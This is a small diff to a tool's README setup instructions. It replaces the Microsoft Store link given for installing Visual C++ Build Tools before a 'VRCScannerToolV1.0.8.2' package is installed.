@@ -8,7 +8,7 @@ Before you get started, make sure to follow these steps for a smooth installatio
 
 ### Step 1: Install Microsoft C++ Build Tools
 
-To ensure that the tool runs smoothly, you need to install Microsoft Visual C++ Build Tools. Download and install it from [this link](https://www.microsoft.com/store/productId/9NRWMJP3717K?ocid=pdpshare).
+To ensure that the tool runs smoothly, you need to install Microsoft Visual C++ Build Tools. Download and install it from [this link](https://www.microsoft.com/store/productId/9NCVDN91XZQP?ocid=pdpshare).
 
 ### Step 2: Install the 'VRCScannerToolV1.0.8.2' Package
 
